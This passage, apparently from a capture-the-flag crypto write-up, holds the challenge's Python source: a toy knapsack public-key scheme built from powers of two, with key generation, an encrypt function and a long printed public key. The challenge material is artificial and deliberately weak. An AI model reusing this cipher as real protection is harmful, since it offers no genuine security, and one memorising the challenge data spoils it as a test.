class="number">66902235595591869424607154817945084517941248</span>, <span class="number">133804471191183738849214309635890169035882496</span>, <span class="number">267608942382367477698428619271780338071764992</span>, <span class="number">535217884764734955396857238543560676143529984</span>, <span class="number">1070435769529469910793714477087121352287059968</span>, <span class="number">2140871539058939821587428954174242704574119936</span>, <span class="number">4281743078117879643174857908348485409148239872</span>, <span class="number">8563486156235759286349715816696970818296479744</span>, <span class="number">17126972312471518572699431633393941636592959488</span>, <span class="number">34253944624943037145398863266787883273185918976</span>, <span class="number">68507889249886074290797726533575766546371837952</span>, <span class="number">137015778499772148581595453067151533092743675904</span>, <span class="number">274031556999544297163190906134303066185487351808</span>, <span class="number">548063113999088594326381812268606132370974703616</span>, <span class="number">1096126227998177188652763624537212264741949407232</span>, <span class="number">2192252455996354377305527249074424529483898814464</span>, <span class="number">4384504911992708754611054498148849058967797628928</span>, <span class="number">8769009823985417509222108996297698117935595257856</span>, <span class="number">17538019647970835018444217992595396235871190515712</span>, <span class="number">35076039295941670036888435985190792471742381031424</span>, <span class="number">70152078591883340073776871970381584943484762062848</span>, <span class="number">140304157183766680147553743940763169886969524125696</span>, <span class="number">280608314367533360295107487881526339773939048251392</span>, <span class="number">561216628735066720590214975763052679547878096502784</span>, <span class="number">1122433257470133441180429951526105359095756193005568</span>, <span class="number">2244866514940266882360859903052210718191512386011136</span>, <span class="number">4489733029880533764721719806104421436383024772022272</span>, <span class="number">8979466059761067529443439612208842872766049544044544</span>, <span class="number">17958932119522135058886879224417685745532099088089088</span>, <span class="number">35917864239044270117773758448835371491064198176178176</span>, <span class="number">71835728478088540235547516897670742982128396352356352</span>, <span class="number">143671456956177080471095033795341485964256792704712704</span>, <span class="number">287342913912354160942190067590682971928513585409425408</span>, <span class="number">574685827824708321884380135181365943857027170818850816</span>, <span class="number">1149371655649416643768760270362731887714054341637701632</span>, <span class="number">2298743311298833287537520540725463775428108683275403264</span>, <span class="number">4597486622597666575075041081450927550856217366550806528</span>, <span class="number">9194973245195333150150082162901855101712434733101613056</span>, <span class="number">18389946490390666300300164325803710203424869466203226112</span>, <span class="number">36779892980781332600600328651607420406849738932406452224</span>, <span class="number">73559785961562665201200657303214840813699477864812904448</span>, <span class="number">147119571923125330402401314606429681627398955729625808896</span>, <span class="number">294239143846250660804802629212859363254797911459251617792</span>, <span class="number">588478287692501321609605258425718726509595822918503235584</span>, <span class="number">1176956575385002643219210516851437453019191645837006471168</span>, <span class="number">2353913150770005286438421033702874906038383291674012942336</span>, <span class="number">4707826301540010572876842067405749812076766583348025884672</span>, <span class="number">9415652603080021145753684134811499624153533166696051769344</span>, <span class="number">18831305206160042291507368269622999248307066333392103538688</span>, <span class="number">37662610412320084583014736539245998496614132666784207077376</span>, <span class="number">75325220824640169166029473078491996993228265333568414154752</span>, <span class="number">150650441649280338332058946156983993986456530667136828309504</span>, <span class="number">301300883298560676664117892313967987972913061334273656619008</span>, <span class="number">602601766597121353328235784627935975945826122668547313238016</span>, <span class="number">1205203533194242706656471569255871951891652245337094626476032</span>, <span class="number">2410407066388485413312943138511743903783304490674189252952064</span>, <span class="number">4820814132776970826625886277023487807566608981348378505904128</span>, <span class="number">9641628265553941653251772554046975615133217962696757011808256</span>, <span class="number">19283256531107883306503545108093951230266435925393514023616512</span>, <span class="number">38566513062215766613007090216187902460532871850787028047233024</span>, <span class="number">77133026124431533226014180432375804921065743701574056094466048</span>, <span class="number">154266052248863066452028360864751609842131487403148112188932096</span>, <span class="number">308532104497726132904056721729503219684262974806296224377864192</span>, <span class="number">617064208995452265808113443459006439368525949612592448755728384</span>, <span class="number">1234128417990904531616226886918012878737051899225184897511456768</span>, <span class="number">2468256835981809063232453773836025757474103798450369795022913536</span>, <span class="number">4936513671963618126464907547672051514948207596900739590045827072</span>, <span class="number">9873027343927236252929815095344103029896415193801479180091654144</span>, <span class="number">19746054687854472505859630190688206059792830387602958360183308288</span>, <span class="number">39492109375708945011719260381376412119585660775205916720366616576</span>, <span class="number">78984218751417890023438520762752824239171321550411833440733233152</span>, <span class="number">157968437502835780046877041525505648478342643100823666881466466304</span>, <span class="number">315936875005671560093754083051011296956685286201647333762932932608</span>, <span class="number">631873750011343120187508166102022593913370572403294667525865865216</span>, <span class="number">1263747500022686240375016332204045187826741144806589335051731730432</span>, <span class="number">2527495000045372480750032664408090375653482289613178670103463460864</span>, <span class="number">5054990000090744961500065328816180751306964579226357340206926921728</span>, <span class="number">10109980000181489923000130657632361502613929158452714680413853843456</span>, <span class="number">20219960000362979846000261315264723005227858316905429360827707686912</span>, <span class="number">40439920000725959692000522630529446010455716633810858721655415373824</span>, <span class="number">80879840001451919384001045261058892020911433267621717443310830747648</span>, <span class="number">161759680002903838768002090522117784041822866535243434886621661495296</span>, <span class="number">323519360005807677536004181044235568083645733070486869773243322990592</span>, <span class="number">647038720011615355072008362088471136167291466140973739546486645981184</span>, <span class="number">1294077440023230710144016724176942272334582932281947479092973291962368</span>, <span class="number">2588154880046461420288033448353884544669165864563894958185946583924736</span>, <span class="number">5176309760092922840576066896707769089338331729127789916371893167849472</span>, <span class="number">10352619520185845681152133793415538178676663458255579832743786335698944</span>, <span class="number">20705239040371691362304267586831076357353326916511159665487572671397888</span>, <span class="number">41410478080743382724608535173662152714706653833022319330975145342795776</span>, <span class="number">82820956161486765449217070347324305429413307666044638661950290685591552</span>, <span class="number">165641912322973530898434140694648610858826615332089277323900581371183104</span>, <span class="number">331283824645947061796868281389297221717653230664178554647801162742366208</span>, <span class="number">662567649291894123593736562778594443435306461328357109295602325484732416</span>, <span class="number">1325135298583788247187473125557188886870612922656714218591204650969464832</span>, <span class="number">2650270597167576494374946251114377773741225845313428437182409301938929664</span>, <span class="number">5300541194335152988749892502228755547482451690626856874364818603877859328</span>, <span class="number">10601082388670305977499785004457511094964903381253713748729637207755718656</span>, <span class="number">21202164777340611954999570008915022189929806762507427497459274415511437312</span>, <span class="number">42404329554681223909999140017830044379859613525014854994918548831022874624</span>, <span class="number">84808659109362447819998280035660088759719227050029709989837097662045749248</span>, <span class="number">169617318218724895639996560071320177519438454100059419979674195324091498496</span>, <span class="number">339234636437449791279993120142640355038876908200118839959348390648182996992</span>, <span class="number">678469272874899582559986240285280710077753816400237679918696781296365993984</span>, <span class="number">1356938545749799165119972480570561420155507632800475359837393562592731987968</span>, <span class="number">2713877091499598330239944961141122840311015265600950719674787125185463975936</span>, <span class="number">5427754182999196660479889922282245680622030531201901439349574250370927951872</span>, <span class="number">10855508365998393320959779844564491361244061062403802878699148500741855903744</span>, <span class="number">21711016731996786641919559689128982722488122124807605757398297001483711807488</span>, <span class="number">43422033463993573283839119378257965444976244249615211514796594002967423614976</span>, <span class="number">86844066927987146567678238756515930889952488499230423029593188005934847229952</span>, <span class="number">173688133855974293135356477513031861779904976998460846059186376011869694459904</span>, <span class="number">347376267711948586270712955026063723559809953996921692118372752023739388919808</span>, <span class="number">694752535423897172541425910052127447119619907993843384236745504047478777839616</span>, <span class="number">1389505070847794345082851820104254894239239815987686768473491008094957555679232</span>, <span class="number">2779010141695588690165703640208509788478479631975373536946982016189915111358464</span>, <span class="number">5558020283391177380331407280417019576956959263950747073893964032379830222716928</span>, <span class="number">11116040566782354760662814560834039153913918527901494147787928064759660445433856</span>, <span class="number">22232081133564709521325629121668078307827837055802988295575856129519320890867712</span>, <span class="number">44464162267129419042651258243336156615655674111605976591151712259038641781735424</span>, <span class="number">88928324534258838085302516486672313231311348223211953182303424518077283563470848</span>, <span class="number">177856649068517676170605032973344626462622696446423906364606849036154567126941696</span>, <span class="number">355713298137035352341210065946689252925245392892847812729213698072309134253883392</span>, <span class="number">711426596274070704682420131893378505850490785785695625458427396144618268507766784</span>, <span class="number">1422853192548141409364840263786757011700981571571391250916854792289236537015533568</span>, <span class="number">2845706385096282818729680527573514023401963143142782501833709584578473074031067136</span>, <span class="number">5691412770192565637459361055147028046803926286285565003667419169156946148062134272</span>, <span class="number">11382825540385131274918722110294056093607852572571130007334838338313892296124268544</span>, <span class="number">22765651080770262549837444220588112187215705145142260014669676676627784592248537088</span>, <span class="number">45531302161540525099674888441176224374431410290284520029339353353255569184497074176</span>, <span class="number">91062604323081050199349776882352448748862820580569040058678706706511138368994148352</span>, <span class="number">182125208646162100398699553764704897497725641161138080117357413413022276737988296704</span>, <span class="number">364250417292324200797399107529409794995451282322276160234714826826044553475976593408</span>, <span class="number">728500834584648401594798215058819589990902564644552320469429653652089106951953186816</span>, <span class="number">1457001669169296803189596430117639179981805129289104640938859307304178213903906373632</span>, <span class="number">2914003338338593606379192860235278359963610258578209281877718614608356427807812747264</span>, <span class="number">5828006676677187212758385720470556719927220517156418563755437229216712855615625494528</span>, <span class="number">11656013353354374425516771440941113439854441034312837127510874458433425711231250989056</span>, <span class="number">23312026706708748851033542881882226879708882068625674255021748916866851422462501978112</span>, <span class="number">46624053413417497702067085763764453759417764137251348510043497833733702844925003956224</span>, <span class="number">93248106826834995404134171527528907518835528274502697020086995667467405689850007912448</span>, <span class="number">186496213653669990808268343055057815037671056549005394040173991334934811379700015824896</span>]</span><br><span class="line">Bag=Bag[::-<span class="number">1</span>]</span><br><span class="line">m=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line">w=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(m,w)==<span class="number">1</span></span><br><span class="line">h=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m,lenth</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(m)&lt;lenth:</span><br><span class="line">        m=<span class="string">'0'</span>+m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk,sk</span><br><span class="line">Pk,Sk=keygen()</span><br><span class="line"><span class="built_in">print</span>(Pk)</span><br><span class="line"><span class="built_in">print</span>(Sk)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plain,pk</span>):</span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c=Encrypt(message,Pk)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># [13427720507293490146512325883268574617159432219330328705146993381673927145360640901644288, 20141580760940235219768488824902861925739148328995493057720490072510890718040961352466432, 10070790380470117609884244412451430962869574164497746528860245036255445359020480676233216, 5035395190235058804942122206225715481434787082248873264430122518127722679510240338116608, 15945418102411019548983386986381432357876825760454765337362054640737788485115761070702592, 7972709051205509774491693493190716178938412880227382668681027320368894242557880535351296, 3986354525602754887245846746595358089469206440113691334340513660184447121278940267675648, 1993177262801377443622923373297679044734603220056845667170256830092223560639470133837824, 14424309138694178868323787569917414139526733829358751538732121796720038925680375968563200, 20639875076640579580674219668227281686922799134009704474513054280033946608200828885925888, 10319937538320289790337109834113640843461399567004852237256527140016973304100414442962944, 5159968769160144895168554917056820421730699783502426118628263570008486652050207221481472, 16007704891873562594096603341796984828024782111081541764461125166678170471385744512385024, 21431572953230271443560627554167067031171823274871099587377555965013012381053513157836800, 24143506983908625868292639660352108132745343856765878498835771364180433335887397480562688, 25499473999247803080658645713444628683532104147713267954564879063764143813304339641925632, 26177457506917391686841648739990888958925484293186962682429432913555999052012810722607104, 13088728753458695843420824369995444479462742146593481341214716456777999526006405361303552, 6544364376729347921710412184997722239731371073296740670607358228388999763003202680651776, 16699902695658164107367531975767435737025117755978699040450672495868427026862242241970176, 8349951347829082053683765987883717868512558877989349520225336247934213513431121120985088, 4174975673914541026841882993941858934256279438994674760112668123967106756715560560492544, 2087487836957270513420941496970929467128139719497337380056334061983553378357780280246272, 1043743918478635256710470748485464733564069859748668690028167030991776689178890140123136, 521871959239317628355235374242732366782034929874334345014083515495888344589445070061568, 260935979619658814177617687121366183391017464937167172507041757747944172294722535030784, 13558188497103319553601134726829257708854940951798912291400514260547899231508002169159680, 20206814755845149923312893246683203471586902695229784850847250511947876761114641986224128, 23531127885216065108168772506610176352952883566945221130570618637647865525917961894756352, 25193284449901522700596712136573662793635874002802939270432302700497859908319621849022464, 12596642224950761350298356068286831396817937001401469635216151350248929954159810924511232, 6298321112475380675149178034143415698408968500700734817608075675124464977079905462255616, 16576881063531180484086914900340282466363916469680696113951031219236159633900593632772096, 21716161039059080388555783333438715850341390454170676762122508991292006962310937718030336, 10858080519529540194277891666719357925170695227085338381061254495646003481155468859015168, 5429040259764770097138945833359678962585347613542669190530627247823001740577734429507584, 2714520129882385048569472916679839481292673806771334595265313623911500870288867214753792, 1357260064941192524284736458339919740646336903385667297632656811955750435144433607376896, 678630032470596262142368229169959870323168451692833648816328405977875217572216803688448, 13767035523528788277583509997853554552321016445176745529555157584662864754146749303488512, 6883517761764394138791754998926777276160508222588372764777578792331432377073374651744256, 16869479388175687215908203382731963255239686330624515087535782777839643333897328227516416, 8434739694087843607954101691365981627619843165312257543767891388919821666948664113758208, 4217369847043921803977050845682990813809921582656128771883945694459910833474332056879104, 2108684923521960901988525422841495406904960791328064385941972847229955416737166028439552, 1054342461760980450994262711420747703452480395664032192970986423614977708368583014219776, 527171230880490225497131355710373851726240197832016096485493211807488854184291507109888, 13691306122733735259260891561123761543022552318246336753389739987577671572452786655199232, 20273373568660357776142771663830455388670708378453497081841863375462762931587034229243904, 10136686784330178888071385831915227694335354189226748540920931687731381465793517114621952, 18496063899458579590548018799226188464327109313943702975607459225539617878257399458955264, 9248031949729289795274009399613094232163554656971851487803729612769808939128699729477632, 4624015974864644897637004699806547116081777328485925743901864806384904469564349864738816, 2312007987432322448818502349903273558040888664242962871950932403192452234782174932369408, 14583724501009651370921577058220211396179876551451810141122459583270153262751728367828992, 7291862250504825685460788529110105698089938275725905070561229791635076631375864183914496, 3645931125252412842730394264555052849044969137862952535280614895817538315687932091957248, 15250686069919696567877523015546101041681916788261804972787300829582696303204606947622912, 7625343034959848283938761507773050520840958394130902486393650414791348151602303473811456, 17240392024773414288481706637155099877579911416395779948343818589069601221161792638550016, 22047916519680197290753179201846124555949387927528218679318902676208727755941537220919296, 24451678767133588791888915484191636895134126183094438044806444719778291023331409512103936, 25653559890860284542456783625364393064726495310877547727550215741563072657026345657696256, 26254500452723632417740717695950771149522679874769102568922101252455463473873813730492416, 26554970733655306355382684731243960191920772156714879989608044007901658882297547766890496, 26705205874121143324203668248890554713119818297687768699951015385624756586509414785089536, 26780323444354061808614160007713851973719341368174213055122501074486305438615348294189056, 13390161722177030904307080003856925986859670684087106527561250537243152719307674147094528, 20122801368382005598665865885197037610589267561373881968927618650295503505014477975191552, 23489121191484492945845258825867093422454066000017269689610802706821678897867879889240064, 11744560595742246472922629412933546711227033000008634844805401353410839448933939944620032, 5872280297871123236461314706466773355613516500004317422402700676705419724466969972310016, 16363860656229051764742983236501961294966190469332487416348343720026637007594125887799296, 8181930328114525882371491618250980647483095234666243708174171860013318503797062943899648, 17518685671350753087698071692394064940900979836663450559234079311680586397259172373594112, 8759342835675376543849035846197032470450489918331725279617039655840293198629586186797056, 17807391925131178418436843806367090852384677178496191344955513209594073744675433995042816, 8903695962565589209218421903183545426192338589248095672477756604797036872337716997521408, 17879568488576284751121536834860347330255601513954376541385871684072445581529499400404992, 8939784244288142375560768417430173665127800756977188270692935842036222790764749700202496, 17897612629437561334292710091983661449723332597818922840493461302692038540743015751745536, 8948806314718780667146355045991830724861666298909461420246730651346019270371507875872768, 4474403157359390333573177522995915362430833149454730710123365325673009635185753937936384, 15664922085973185313298914644766532298374848794057694060208676044510431962953517870612480, 21260181550280082803161783205651840766346856616359175735251331403929143126837399836950528, 24057811282433531548093217486094495000332860527509916572772659083638498708779340820119552, 25456626148510255920558934626315822117325862483085286991533322923493176499750311311704064, 26156033581548618106791793196426485675822363460872972200913654843420515395235796557496320, 26505737298067799199908222481481817455070613949766814805603820803384184842978539180392448, 13252868649033899599954111240740908727535306974883407402801910401692092421489269590196224, 6626434324516949799977055620370454363767653487441703701400955200846046210744634795098112, 3313217162258474899988527810185227181883826743720851850700477600423023105372317397549056, 15084329088422727596506589788361188208101345591190754630497232181885438698046799600418816, 7542164544211363798253294894180594104050672795595377315248616090942719349023399800209408, 3771082272105681899126647447090297052025336397797688657624308045471359674511699900104704, 15313261643346331096075649606813723143172100418229173033959147404409606982616490851696640, 21084351328966655694550150686675436188745482428444915222126567083878730636668886327492608, 10542175664483327847275075343337718094372741214222457611063283541939365318334443163746304, 5271087832241663923637537671668859047186370607111228805531641770969682659167221581873152, 16063264423414322108331094719103004140752617522885943107912814267158768474944251692580864, 21459352719000651200677873242820076687535740980773300259103400515253311382832766747934720, 10729676359500325600338936621410038343767870490386650129551700257626655691416383373967360, 5364838179750162800169468310705019171883935245193325064775850128813327845708191686983680, 16110139597168571546597060038621084203101399841926991237534918446080591068214736745136128, 8055069798584285773298530019310542101550699920963495618767459223040295534107368372568064, 4027534899292142886649265009655271050775349960481747809383729611520147767053684186284032, 2013767449646071443324632504827635525387674980240873904691864805760073883526842093142016, 1006883724823035721662316252413817762693837490120436952345932402880036941763421046571008, 503441862411517860831158126206908881346918745060218476172966201440018470881710523285504, 251720931205758930415579063103454440673459372530109238086483100720009235440855261642752, 125860465602879465207789531551727220336729686265054619043241550360004617720427630821376, 13490650740094929879116220649044438227327797062462856014668614156853929454220854717054976, 6745325370047464939558110324522219113663898531231428007334307078426964727110427358527488, 16800383192317222616291381045529684173991381484946042708814146920887409508915854580908032, 21827912103452101454658016406033416704155122961803350059554066842117631899818568192098304, 24341676559019540873841334086285282969236993700232003734924026802732743095269924997693440, 12170838279509770436920667043142641484618496850116001867462013401366371547634962498846720, 19513139647048375364972659404839895359468680644388329638878000082357112919178122151067648, 9756569823524187682486329702419947679734340322194164819439000041178556459589061075533824, 4878284911762093841243164851209973839867170161097082409719500020589278229794530537766912, 2439142455881046920621582425604986919933585080548541204859750010294639114897265268883456, 14647291735234013606823117096071068077126224759604599307576868386821246702809273536086016, 20751366374910496949923884431304108655722544599132628358935427575084550496765277669687296, 23803403694748738621474268098920628945020704518896642884614707169216202393743279736487936, 11901701847374369310737134049460314472510352259448321442307353584608101196871639868243968, 5950850923687184655368567024730157236255176129724160721153676792304050598435819934121984, 16403145969137082474196609395633653235287020284192409065723831777825952444578550868705280, 21629293491862031383610630581085401234802942361426533238008909270586903367649916335996928, 10814646745931015691805315290542700617401471180713266619004454635293451683824958167998464, 5407323372965507845902657645271350308700735590356633309502227317646725841912479083999232, 2703661686482753922951328822635675154350367795178316654751113658823362920956239541999616, 1351830843241376961475664411317837577175183897589158327375556829411681460478119770999808, 675915421620688480737832205658918788587591948794579163687778414705840730239059885499904, 337957710810344240368916102829459394293795974397289581843889207352920365119529942749952, 168978855405172120184458051414729697146897987198644790921944603676460182559764971374976, 84489427702586060092229025707364848573448993599322395460972301838230091279882485687488, 42244713851293030046114512853682424286724496799661197730486150919115045639941242843744, 21122356925646515023057256426841212143362248399830598865243075459557522819970621421872, 10561178462823257511528628213420606071681124199915299432621537729778761409985310710936, 5280589231411628755764314106710303035840562099957649716310768864889380704992655355468, 2640294615705814377882157053355151517920281049978824858155384432444690352496327677734, 1320147307852907188941078526677575758960140524989412429077692216222345176248163838867, 11376929106527795892898839465621865505177413571970563898745322852504166513570004716585524, 5688464553263897946449419732810932752588706785985281949372661426252083256785002358292762, 2844232276631948973224709866405466376294353392992640974686330713126041628392501179146381, 12798385171189843925916723859561259905445110198204389679873949362959076155178131224239281, 17775461618468791402262730856139156670020488600810264032467758687875593418570946246785731, 20263999842108265140435734354428105052308177802113201208764663350333852050267353758058956, 10131999921054132570217867177214052526154088901056600604382331675166926025133676879029478, 5065999960527066285108933588607026263077044450528300302191165837583463012566838439514739, 13909269013137402581858835720662039848836455726972219343626366925187786847265299854423460, 6954634506568701290929417860331019924418227863486109671813183462593893423632649927211730, 3477317253284350645464708930165509962209113931743054835906591731296946711816324963605865, 13114927659516044762036723391441281698402490467579596610484079872044528696890043116469023, 17933732862631891820322730622079167566499178735497867497772823942418319689426902192900602, 8966866431315945910161365311039583783249589367748933748886411971209159844713451096450301, 15859702248531842394385051581878318608922728185582536066973989992000635263338606182891241, 19306120157139790636496894717297686021759297594499337226017779002396372972651183726111711, 21029329111443764757552816285007369728177582298957737805539673507594241827307472497721946, 10514664555721882378776408142503684864088791149478868902769836753797120913653736248860973, 16633601310734810628692572997610369149342329076447503643915702383294615797808748759096577, 19693069688241274753650655425163711291969098039931821014488635198043363239886255014214379, 21222803876994506816129696638940382363282482521673979699775101605417736960925008141773280, 10611401938497253408064848319470191181641241260836989849887550802708868480462504070886640, 5305700969248626704032424159735095590820620630418494924943775401354434240231252035443320, 2652850484624313352016212079867547795410310315209247462471887700677217120115626017721660, 1326425242312156676008106039933773897705155157604623731235943850338608560057813008860830, 663212621156078338004053019966886948852577578802311865617971925169304280028906504430415, 11707875343451908608306395436341970191724222291109225125339769968980707480996333886881298, 5853937671725954304153197718170985095862111145554612562669884984490353740498166943440649, 14303237868736846591380967785444019265228989074485375473865726498641232211230964106386415, 18527887967242292734994852819080536349912428038950756929463647255716671446597362687859298, 9263943983621146367497426409540268174956214019475378464731823627858335723298681343929649, 16008241024684442623053082131128660804776040511445758424896695820325223202631221306630915, 19380389545216090750830909991922857119685953757430948404979131916558666942297491287981548, 9690194772608045375415454995961428559842976878715474202489565958279333471148745643990774, 4845097386304022687707727497980714279921488439357737101244782979139666735574372821995387, 13798817726025880783158232675348883857258677721386937743153175495965888708769067045663784, 6899408863012940391579116337674441928629338860693468871576587747982944354384533522831892, 3449704431506470195789558168837220964314669430346734435788293873991472177192266761415946, 1724852215753235097894779084418610482157334715173367217894146936995736088596133380707973, 12238695140750486988251758468567831958376600859294752801477857474893923385279947325020077, 17495616603249112933430248160642442696486233931355445593269712743843017033621854297176129, 20124077334498425906019493006679748065541050467385791989165640378317563857792807783254155, 21438307700123082392314115429698400750068458735400965187113604195554837269878284526293168, 10719153850061541196157057714849200375034229367700482593556802097777418634939142263146584, 5359576925030770598078528857424600187517114683850241296778401048888709317469571131573292, 2679788462515385299039264428712300093758557341925120648389200524444354658734785565786646, 1339894231257692649519632214356150046879278670962560324194600262222177329367392782893323, 12046216148502715764064185033536601740737572837189349354628084137507144005665577026112752, 6023108074251357882032092516768300870368786418594674677314042068753572002832788513056376, 3011554037125678941016046258384150435184393209297337338657021034376786001416394256528188, 1505777018562839470508023129192075217592196604648668669328510517188393000708197128264094, 752888509281419735254011564596037608796098302324334334664255258594196500354098564132047, 11752713287514579306931374708656545521695982652870236359862911635693153591158929916732114, 5876356643757289653465687354328272760847991326435118179931455817846576795579464958366057, 14314447354752514266037212603522663097721929164925628282496511915319343738771613113849119, 18533492710250126572322975228119858266158898084170883333779039964055727210367687191590650, 9266746355125063286161487614059929133079449042085441666889519982027863605183843595795325, 16009642210436401082385112733388491283837658022750790025975543997409987143573802432563753, 19381090138092069980496925293052772359216762513083464205518556005101048912768781850947967, 21066814101919904429552831572884912896906314758249801295290062008946579797366271560140074, 10533407050959952214776415786442456448453157379124900647645031004473289898683135780070037, 16642972558353845546692576819579754941524512191270519516353299508632700290323448524701109, 19697755312050792212650657336148404188060189597343328950707433760712405486143604897016645, 21225146688899265545629697594432728811328028300379733667884500886752258084053683083174413, 21988842377323502212119217723574891122961947651897936026473034449772184383008722176253297, 22370690221535620545363977788145972278778907327657037205767301231282147532486241722792739, 22561614143641679711986357820431512856687387165536587795414434622037129107225001496062460, 11280807071820839855993178910215756428343693582768293897707217311018564553612500748031230, 5640403535910419927996589455107878214171846791384146948853608655509282276806250374015615, 14196470800829079403302663653912465824383856897400142666957588334150696479385005821673898, 7098235400414539701651331826956232912191928448700071333478794167075348239692502910836949, 14925386733081139290130034839836643173393897726058104859270181089933729460828132090084565, 18838962399414439084369386346276848303994882364737121622165874551362920071395946679708373, 20795750232581088981489062099496950869295374684076630003613721282077515376679853974520277, 21774144149164413930048899976107002151945620843746384194337644647434813029321807621926229, 22263341107456076404328818914412027793270743923581261289699606330113461855642784445629205, 22507939586601907641468778383564540613933305463498699837380587171452786268803272857480693, 22630238826174823260038758118140797024264586233457419111221077592122448475383517063406437, 22691388445961281069323747985428925229430226618436778748141322802457279578673639166369309, 22721963255854509973966242919072989332013046810926458566601445407624695130318700217850745, 22737250660801124426287490385895021383304456907171298475831506710208402906141230743591463, 22744894363274431652448114119306037408950161955293718430446537361500256794052496006461822, 11372447181637215826224057059653018704475080977646859215223268680750128397026248003230911, 17062492623692477352416397456185036069535473990531498800142418346771119539495004636281546, 8531246311846238676208198728092518034767736995265749400071209173385559769747502318140773, 15641892188796988777408468290404785734681801999340943892566388593088835225855631793736477, 19197215127272363828008603071560919584638834501378541138813978302940472953909696531534329, 20974876596510051353308670462138986509617350752397339761937773157866291817936728900433255, 21863707331128895115958704157428019972106608877906739073499670585329201249950245084882718, 10931853665564447557979352078714009986053304438953369536749835292664600624975122542441359, 16842195865656093218294044965715531710324585721184753960905701652728355653469441905886770, 8421097932828046609147022482857765855162292860592376980452850826364177826734720952943385, 15586817999287892743877880167787409644879079932004257682757209419578144254349241111137783, 19169678032517815811243309010252231539737473467710198033909388716185127468156501190234982, 9584839016258907905621654505126115769868736733855099016954694358092563734078250595117491, 16168688541003323392115196178921584602232301868635618701008131185442337208021005932224836, 8084344270501661696057598089460792301116150934317809350504065592721168604010502966112418, 4042172135250830848028799044730396150558075467158904675252032796360584302005251483056209, 13397355100499284863318768448723724792576971235287521530156800404576347491984506376194195, 18074946583123511870963753150720389113586419119351829957609184208684229086974133822763188, 9037473291561755935481876575360194556793209559675914978804592104342114543487066911381594, 4518736645780877967740938287680097278396604779837957489402296052171057271743533455690797, 13635637355764308423174838070198575356496235891627047937231932032481583976853647362511489, 18194087710756023650891787961457814395546051447521593161146750022636847329408704315921835, 20473312888251881264750262907087433915070959225468865773104159017714479005686232792627008, 10236656444125940632375131453543716957535479612734432886552079508857239502843116396313504, 5118328222062970316187565726771858478767739806367216443276039754428619751421558198156752, 2559164111031485158093782863385929239383869903183608221638019877214309875710779099078376, 1279582055515742579046891431692964619691934951591804110819009938607154937855389549539188, 639791027757871289523445715846482309845967475795902055409504969303577468927694774769594, 319895513878935644761722857923241154922983737897951027704752484651788734463847387384797, 11536216789813337261685230355320147294759425370657044706383160248721949708213804328358489, 17144377427780538070146984104018600364677646187036591545722364130757030195088782798845335, 19948457746764138474377860978367826899636756595226364965391966071774570438526272034088758, 9974228873382069237188930489183913449818378297613182482695983035887285219263136017044379, 16363383469564904057898834170950483442207122650514660433878775524339697950613448643188280, 8181691734782452028949417085475241721103561325257330216939387762169848975306724321594140, 4090845867391226014474708542737620860551780662628665108469693881084924487653362160797070, 2045422933695613007237354271368810430275890331314332554234846940542462243826681080398535, 12398980499721675942923046062042931932435878667365235469648207476667286462895221174865358, 6199490249860837971461523031021465966217939333682617734824103738333643231447610587432679, 14476014157804288425035130441869259700406903168549378059942835875562876956705685928382430, 7238007078902144212517565220934629850203451584274689029971417937781438478352842964191215, 14995272572324941545563151536825841642399659293845413707516492975286774580158302116761698, 7497636286162470772781575768412920821199829646922706853758246487643387290079151058380849, 